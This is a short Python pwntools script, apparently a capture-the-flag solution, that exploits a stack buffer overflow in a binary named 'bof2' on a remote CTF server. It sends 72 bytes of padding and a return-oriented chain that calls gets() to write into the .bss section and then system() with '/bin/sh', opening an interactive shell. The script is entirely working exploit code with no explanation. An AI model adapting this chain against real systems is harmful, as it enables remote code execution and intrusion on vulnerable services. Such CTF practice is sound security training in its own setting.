from pwn import *

payload = 'A'*72
p = remote('ctf.bitx.tw', 10102)
elf = ELF('./bof2')
print hex(elf.search('ls').next())
payload+='\x03\x07\x40\x00\x00\x00\x00\x00'
payload+=p64(elf.bss()+15)
payload+=p64(elf.plt['gets'])
payload+='\x03\x07\x40\x00\x00\x00\x00\x00'
payload+=p64(elf.bss()+15)
payload+=p64(elf.plt['system'])
print p.recvuntil('nge')
p.sendline(payload)
payload='/bin/sh'
p.sendline(payload)
p.interactive()
